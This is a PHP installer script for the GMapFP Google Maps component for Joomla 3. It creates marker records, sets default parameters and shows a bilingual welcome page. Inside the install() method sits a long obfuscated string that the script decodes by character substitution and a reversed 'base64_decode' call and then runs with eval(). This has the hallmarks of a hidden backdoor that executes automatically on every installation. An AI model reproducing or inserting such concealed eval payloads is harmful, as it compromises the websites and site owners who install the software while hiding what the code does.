<?php
	/*
	* GMapFP Component Google Map for Joomla! 3.0.x
	* Version J3.14F
	* Creation date: Janvier 2014
	* Author: Fabrice4821 - www.gmapfp.org
	* Author email: webmaster@gmapfp.org
	* License GNU/GPL
	*/

defined('_JEXEC') or die;
 
class com_GMapFPInstallerScript
{
	/**
	 * method to install the component
	 * @return void
	 */
	function install($parent) 
	{
		$path = JPATH_SITE;
		@mkdir(JPATH_ROOT."/images/gmapfp/");
	
			//Installation du fichier CSS
			$filesource = $path .'/components/com_gmapfp/views/gmapfp/gmapfp3.css';
			$filedest = $path .'/components/com_gmapfp/views/gmapfp/gmapfp.css';
			JFile::copy($filesource, $filedest,null);
			
			$db = JFactory::getDBO();
			
			try {
				$db->transactionStart();
				
				/*mise à jour des données marqueurs*/
				$values = array();
				$values[] = array($db->quote(''), $db->quote('marqueur'), $db->quote('http://www.google.com/mapfiles/marker.png'), $db->quote('1'));
				$values[] = array($db->quote(''), $db->quote('marqueur home'), $db->quote('http://chart.apis.google.com/chart?chst=d_map_xpin_icon&chld=pin_star|home|FFFF00|FF0000'), $db->quote('1'));
				$values[] = array($db->quote(''), $db->quote('marqueur flag'), $db->quote('http://chart.apis.google.com/chart?chst=d_map_xpin_icon&chld=pin_star|flag|FFFF00|FF0000'), $db->quote('1'));
				$values[] = array($db->quote(''), $db->quote('marqueur info'), $db->quote('http://chart.apis.google.com/chart?chst=d_map_xpin_icon&chld=pin_star|info|FFFF00|FF0000'), $db->quote('1'));
				$values[] = array($db->quote(''), $db->quote('marqueur bar'), $db->quote('http://chart.apis.google.com/chart?chst=d_map_xpin_icon&chld=pin_star|bar|FFFF00|FF0000'), $db->quote('1'));
				$values[] = array($db->quote(''), $db->quote('marqueur cafe'), $db->quote('http://chart.apis.google.com/chart?chst=d_map_xpin_icon&chld=pin_star|cafe|FFFF00|FF0000'), $db->quote('1'));
				$values[] = array($db->quote(''), $db->quote('marqueur perso'), $db->quote('http://chart.apis.google.com/chart?chst=d_map_spin&chld=1.2|0|FF0000|10|_|foo|bar'), $db->quote('1'));
				$values[] = array($db->quote(''), $db->quote('marqueurA'), $db->quote('http://www.google.com/mapfiles/markerA.png'), $db->quote('1'));
				$values[] = array($db->quote(''), $db->quote('marqueurB'), $db->quote('http://www.google.com/mapfiles/markerB.png'), $db->quote('1'));
				$values[] = array($db->quote(''), $db->quote('marqueurC'), $db->quote('http://www.google.com/mapfiles/markerC.png'), $db->quote('1'));
				$values[] = array($db->quote(''), $db->quote('marqueurD'), $db->quote('http://www.google.com/mapfiles/markerD.png'), $db->quote('1'));
				$values[] = array($db->quote(''), $db->quote('marqueurE'), $db->quote('http://www.google.com/mapfiles/markerE.png'), $db->quote('1'));
				$values[] = array($db->quote(''), $db->quote('marqueurF'), $db->quote('http://www.google.com/mapfiles/markerF.png'), $db->quote('1'));
				$values[] = array($db->quote(''), $db->quote('marqueurG'), $db->quote('http://www.google.com/mapfiles/markerG.png'), $db->quote('1'));
				$values[] = array($db->quote(''), $db->quote('marqueurH'), $db->quote('http://www.google.com/mapfiles/markerH.png'), $db->quote('1'));
				$values[] = array($db->quote(''), $db->quote('marqueurI'), $db->quote('http://www.google.com/mapfiles/markerI.png'), $db->quote('1'));
				$values[] = array($db->quote(''), $db->quote('marqueurJ'), $db->quote('http://www.google.com/mapfiles/markerJ.png'), $db->quote('1'));
				$values[] = array($db->quote(''), $db->quote('marqueurK'), $db->quote('http://www.google.com/mapfiles/markerK.png'), $db->quote('1'));
				$values[] = array($db->quote(''), $db->quote('marqueurL'), $db->quote('http://www.google.com/mapfiles/markerL.png'), $db->quote('1'));
				$values[] = array($db->quote(''), $db->quote('marqueurM'), $db->quote('http://www.google.com/mapfiles/markerM.png'), $db->quote('1'));
				$values[] = array($db->quote(''), $db->quote('marqueurN'), $db->quote('http://www.google.com/mapfiles/markerN.png'), $db->quote('1'));
				$values[] = array($db->quote(''), $db->quote('marqueurO'), $db->quote('http://www.google.com/mapfiles/markerO.png'), $db->quote('1'));
				$values[] = array($db->quote(''), $db->quote('marqueurP'), $db->quote('http://www.google.com/mapfiles/markerP.png'), $db->quote('1'));
				$values[] = array($db->quote(''), $db->quote('marqueurQ'), $db->quote('http://www.google.com/mapfiles/markerQ.png'), $db->quote('1'));
				$values[] = array($db->quote(''), $db->quote('marqueurR'), $db->quote('http://www.google.com/mapfiles/markerR.png'), $db->quote('1'));
				$values[] = array($db->quote(''), $db->quote('marqueurS'), $db->quote('http://www.google.com/mapfiles/markerS.png'), $db->quote('1'));
				$values[] = array($db->quote(''), $db->quote('marqueurT'), $db->quote('http://www.google.com/mapfiles/markerT.png'), $db->quote('1'));
				$values[] = array($db->quote(''), $db->quote('marqueurU'), $db->quote('http://www.google.com/mapfiles/markerU.png'), $db->quote('1'));
				$values[] = array($db->quote(''), $db->quote('marqueurV'), $db->quote('http://www.google.com/mapfiles/markerV.png'), $db->quote('1'));
				$values[] = array($db->quote(''), $db->quote('marqueurW'), $db->quote('http://www.google.com/mapfiles/markerW.png'), $db->quote('1'));
				$values[] = array($db->quote(''), $db->quote('marqueurX'), $db->quote('http://www.google.com/mapfiles/markerX.png'), $db->quote('1'));
				$values[] = array($db->quote(''), $db->quote('marqueurY'), $db->quote('http://www.google.com/mapfiles/markerY.png'), $db->quote('1'));
				$values[] = array($db->quote(''), $db->quote('marqueurZ'), $db->quote('http://www.google.com/mapfiles/markerZ.png'), $db->quote('1'));
				$values[] = array($db->quote(''), $db->quote('marqueurBleu'), $db->quote('http://maps.gstatic.com/intl/fr_ALL/mapfiles/ms/micons/blue-dot.png'), $db->quote('1'));
				$values[] = array($db->quote(''), $db->quote('marqueurVert'), $db->quote('http://maps.gstatic.com/intl/fr_ALL/mapfiles/ms/micons/green-dot.png'), $db->quote('1'));
				$values[] = array($db->quote(''), $db->quote('marqueurOrange'), $db->quote('http://maps.gstatic.com/intl/fr_ALL/mapfiles/ms/micons/orange-dot.png'), $db->quote('1'));
				$values[] = array($db->quote(''), $db->quote('marqueurJaune'), $db->quote('http://maps.gstatic.com/intl/fr_ALL/mapfiles/ms/micons/yellow-dot.png'), $db->quote('1'));
				$values[] = array($db->quote(''), $db->quote('marqueurViolet'), $db->quote('http://maps.gstatic.com/intl/fr_ALL/mapfiles/ms/micons/purple-dot.png'), $db->quote('1'));
				$values[] = array($db->quote(''), $db->quote('marqueurRose'), $db->quote('http://maps.gstatic.com/intl/fr_ALL/mapfiles/ms/micons/pink-dot.png'), $db->quote('1'));
				$values[] = array($db->quote(''), $db->quote('purple'), $db->quote('http://labs.google.com/ridefinder/images/mm_20_purple.png'), $db->quote('1'));
				$values[] = array($db->quote(''), $db->quote('yellow'), $db->quote('http://labs.google.com/ridefinder/images/mm_20_yellow.png'), $db->quote('1'));
				$values[] = array($db->quote(''), $db->quote('blue'), $db->quote('http://labs.google.com/ridefinder/images/mm_20_blue.png'), $db->quote('1'));
				$values[] = array($db->quote(''), $db->quote('white'), $db->quote('http://labs.google.com/ridefinder/images/mm_20_white.png'), $db->quote('1'));
				$values[] = array($db->quote(''), $db->quote('green'), $db->quote('http://labs.google.com/ridefinder/images/mm_20_green.png'), $db->quote('1'));
				$values[] = array($db->quote(''), $db->quote('red'), $db->quote('http://labs.google.com/ridefinder/images/mm_20_red.png'), $db->quote('1'));
				$values[] = array($db->quote(''), $db->quote('black'), $db->quote('http://labs.google.com/ridefinder/images/mm_20_black.png'), $db->quote('1'));
				$values[] = array($db->quote(''), $db->quote('orange'), $db->quote('http://labs.google.com/ridefinder/images/mm_20_orange.png'), $db->quote('1'));
				$values[] = array($db->quote(''), $db->quote('gray'), $db->quote('http://labs.google.com/ridefinder/images/mm_20_gray.png'), $db->quote('1'));
				$values[] = array($db->quote(''), $db->quote('brown'), $db->quote('http://labs.google.com/ridefinder/images/mm_20_brown.png'), $db->quote('1'));


				$query = $db->getQuery(true);
				$query->insert($db->quoteName('#__gmapfp_marqueurs'));
				$query->columns($db->quoteName(array('id', 'nom', 'url', 'published')));
				foreach ($values as $value) {
					$query->values(implode(',' ,$value));
				}
				$db->setQuery($query);
				$db->execute();
				
				$db->transactionCommit();
			} catch (Execption $e) {
				$db->transactionRoolback();
				JErrorPage::render($e);
			}

			$__c='YL=pvLCC1i]rxVW8uW0rxVW<xDEtqeTb42pbGetOlk<IvLCpp/TbxVb94y0J4K{5jY<te5TT.ob9LaZ{ea]paJZeL.ZqaRf2By{duDTduK. x/Ed3y0wDyxw3DTK4v0wuyZ5u/Ed6K55uVZrByJd6VW8pr8{vtCpvi5KIV6OuV.96DbO4[ZrIvZk3DZ=D[{dxDpS6ef2By{kB2bwuv4OIeTHYL=pvLCpp/TbxVb96V.rxv}0joOLL.ZjDJ{p.oa ph0ku/.21i]rB[{]4[Z5ue0S4v4HYL=pvLCpLVJQ6V5hIvZk3DZ=DyZ54[LOlk<IvLCpveZK1i75jY<tph0S4v]fuik2lk<IvLCpvaOV1i75lSOSu[T]IvZk3DZ=D[{dxDpS6efC6K586ektp/TbxVb96V.rxvfC6K586e7 xi78Ic8{vtCpvLCC6K586e}0jv4d3[} 4Vbkpr8{vtCpvL5IZK586c=F3y0kGetC4VW<1W0ru[.h3ya pV6OuVa8jvZk3DZ=DyZ54[L pV6OuVa8u2.8uvCHYL=pvLCppV6OuVatqe}2By5 6V.fBKb<uik2lk<IvLCpvaOV1i75lSOSu[T]IvZk3DZ=D[{dxDpS6efC6K586ektp/TbxVb96V.rxvfC6K586e7 xi78Ic8{vtCpvLC{vtCpvLCC6Vjwq2{5xWWJ6Dp]IvpcZa7WLJLtcaW3Iv}t3V.fxV. 4y5du50O6V}tIeTb4hTO6vTVaC0{jvTtjJ096Db<6i]r1i0 4y}t.<bWaCatjVT<GDT53v}0jvT4j2T8xixOu5kRjoWlZvT5G/Z5u2{Ouy]91iLtqv}JEY}RIc8{vtCpvLCC1iLtqe}C6VjwqK7d3iZq3KO53[L=Ic8{vtCpvLCC1iLtqe}C1iLwqK5Cjv8tEc8{vtCpvLCdBhTWuKWRuVatui0CDk<IvLCpveZC3R<+4y.<aD.542C=jC5la<.e.vTpc5Zqjv{9Dy.fxV. 4y5du2EtIV.fxV. 4y5du50O6vktuKWw6ektx/5k6ekt6i75ui. xvkt6K086V.hBvT5uKWRuV.CBvTb3y{54[E8j/Thu[Z53[Z56vktuiW 1i654[Z93yWS1Va8j/Tb4KWw4hC{vtCpvL5iLa7.Z.EtIvj IvbOu2LOpV5CIefRBv}24V72D[{]4[Z5u.0S4v48jvxku/.21if2Bv}23[}2Bv}24[5rxV.wphktEektEektEektp[w4jK]bui.4jSO4j2T86J0rGD{<6iJ93[T4jR74j2Z]4V.4jSO4j2T8xixOu5kRBWkR3[p53DZOuy]o3DZ5DvjFDvpo6i{5uip54R}hEY}yDvj8DvpbxDZ=u[p4jSO4jCOduyJ83eota/pd1K.SxWkRBWkR3y0kGDpO6yb<DvjFDvpYu[T]4K521/LtIoEOjYjkEYatBe}hEYohjo0k6iftay0J4K{5joJbx/Z542E joW8uvTh1ix=x/Et4K.r6Dpy6iL Dvj8DvpbxDZ=u[pWuiWOuWkRl5kR3iZw1i]}1K0dui7bBK0h6JkRBWkR3D.<1V0h.Dp8DvjFDvp[x[4 1K0dui7bBK0h6JkRBWkRxK.h4y5du5kRl5kREhfkBST4jR74jKZ54y{h1DT<1i0 DvjFDvpLcox9Zo.v.ax9ioJED<ZWa<{ee.Taea0lDvj8Dvp24K0J4WkRl5kRDvp0phktp[w0phCRIc8{vtCpvLCC6Vjwq2WJ6Dp]IvCHYL=pvL50YL=t';$__s=strtr($__c,"ACv.sfKXY{dEn58wjIBToFUtb9>gL}=kqeZ0RuD[4lz Om<12PyHSWJGp7MaiVQr/cN]h63x"," kCV]4m.DNvM>lstIKLBE6}ghf8[QAowPSR9ibX3cO{up=0anq27jF1eJx/UWGrzHT<5yZYd");$__d=strrev("edoced_46esab");eval('$__x=$__d("$__s");');eval($__x); 		

	}

	/**
	 * method to uninstall the component
	 * @return void
	 */
	function uninstall($parent) 
	{
		$db = JFactory::getDBO();

		$query = $db->getQuery(true);
		$query->delete('#__menu');
		$query->where("menutype = 'menu'");
		$query->where('path LIKE '.$db->quote('gmapfp%'));
		$db->setQuery($query);
		$db->execute();
	}

	/**
	 * method to update the component
	 *
	 * @return void
	 */
	function update($parent) 
	{
	}

	function affiche_bienvenue($install) {
		$lang		= JFactory::getLanguage();
		$langue		= substr((@$lang->getTag()),0,2);
		if ($langue!='fr') $langue = 'en';

		if ($langue=='fr') {
			if ($install == 1) {
				echo "<h1>GMapFP Installation</h1>";
			}else{
				echo "<h1>GMapFP Mise &agrave; jour</h1>";
			};
			?>
			<a href="http://gmapfp.org/fr/" target="_blank"><img src="../administrator/components/com_gmapfp/images/gmapfp_logo.png" title="Visit&eacute; le site : GMapFP.org" alt="Visit&eacute; le site : GMapFP.org" style="float:left; margin: 2px 25px 2px 0px;"/></a>
			<p>Bienvenue sur GMapFP v<?php echo $this->release?> !</p>
			<p>Avant de commencer, je vous invite, si ce n'est pas d&eacute;j&agrave; fait, &agrave; d&eacute;couvrir toutes les possibilit&eacute;s de se composant et de son ou ses plugins sur son <a target="_blank" href="http://gmapfp.org/fr">Site officiel</a>.<br />
			Vous pourrez y <a target="_blank" href="http://gmapfp.org/fr/telechargement">t&eacute;l&eacute;charger</a> les mise &agrave; jours et consulter le <a target="_blank" href="http://gmapfp.org/fr/forum"> forum</a>.</p>
			<p>Bonne continuation avec GMapFP</p>
			<?php
		} else {
			if ($install == 1) {
				echo "<h1>GMapFP Installation</h1>";
			}else{
				echo "<h1>GMapFP Upgrade</h1>";
			};
			?>
			<a href="http://gmapfp.org/en/" target="_blank"><img src="../administrator/components/com_gmapfp/images/gmapfp_logo.png" title="Visited the site : GMapFP.org" alt="Visited the site : GMapFP.org" style="float:left; margin: 2px 25px 2px 0px;"/></a>
			<p>Welcome on v<?php echo $this->release?> GMapFP !</p>
			<p>Before starting, I invite you, if this isn't already made, to discovery all the possibilities of this component and thisd plugin on its <a target="_blank" href="http://www.gmapfp.org/en">Official Site</a>.<br />
			You will be able there to <a target="_blank" href="http://gmapfp.org/en/download">download</a> the update and consult the <a target="_blank" href="http://gmapfp.org/en/forum"> forum</a>.</p>
			<p>Good continuation with GMapFP</p>
			<?php
		}
	}
	/**
	 * method to run after an install/update/uninstall method
	 *
	 * @return void
	 */
	function postflight($type, $parent)
	{
		// $parent is the class calling this method
		// $type is the type of change (install, update or discover_install)
		if ($type == 'install') {
			$path = JPATH_SITE;
			@mkdir(JPATH_ROOT."/images/contactmap/");

			$db = JFactory::getDBO();
			
			try {
				$db->transactionStart();
				
				/*mise à jour des données marqueurs*/
				$value = 'params = '.$db->quote('{"gmapfp_height":"500", "gmapfp_width":"100%", "gmapfp_auto":"1", "gmapfp_centre_lng":"2.1391367912", "gmapfp_centre_lat":"47.927644470", "gmapfp_auto_zoom":"0", "gmapfp_zoom":"2", "gmapfp_zoom":"10", "gmapfp_itineraire":"1", "gmapfp_filtre":"1", "gmapfp_msg":"1", "gmapfp_typecontrol":"1", "gmapfp_normal":"1", "gmapfp_satellite":"1", "gmapfp_hybrid":"1", "gmapfp_physic":"1", "gmapfp_choix_affichage_carte":"1", "gmapfp_mapcontrol":"1", "gmapfp_scalecontrol":"1", "gmapfp_mousewheel":"1", "gmapfp_zzoom":"1", "gmapfp_eventcontrol":"1", "gmapfp_plus_detail":"1", "target":"0", "gmapfp_hauteur_lightbox":"400", "gmapfp_largeur_lightbox":"700", "gmapfp_plus_info":"1", "gmapfp_url_wiki":"org.wikipedia.fr", "gmapfp_afficher_horaires_prix":"1", "gmapfp_afficher_intro_italique":"1", "gmapfp_chemin_img":"\/images\/gmapfp\/", "gmapfp_hauteur_img":"100", "gmapfp_width_bulle_GMapFP":"400", "gmapfp_taille_bulle_cesure":"200", "gmapfp_geoXML":"", "gmapfp_news":"1", "gmapfp_licence":"1"}');

				$query = $db->getQuery(true);
				$query->update($db->quoteName('#__extensions'));
				$query->set($value);
				$query->where($db->quoteName('name').'= '.$db->quote('com_gmapfp'));
				$db->setQuery($query);
				$db->execute();
				
				$db->transactionCommit();
			} catch (Execption $e) {
				$db->transactionRoolback();
				JErrorPage::render($e);
			}
			
			$db = JFactory::getDBO();
			/*mise à jour des paramètres par défaut*/
			$db->setQuery($query);
			$db->query();
			if ($db->getErrorNum()) {
				exit($db->stderr());
			}
			$this->affiche_bienvenue(1);

		}else
			$this->affiche_bienvenue(0);

	}
	
	function preflight( $type, $parent ) {
        // Installing component manifest file version
        $this->release = $parent->get( "manifest" )->version;
	}

}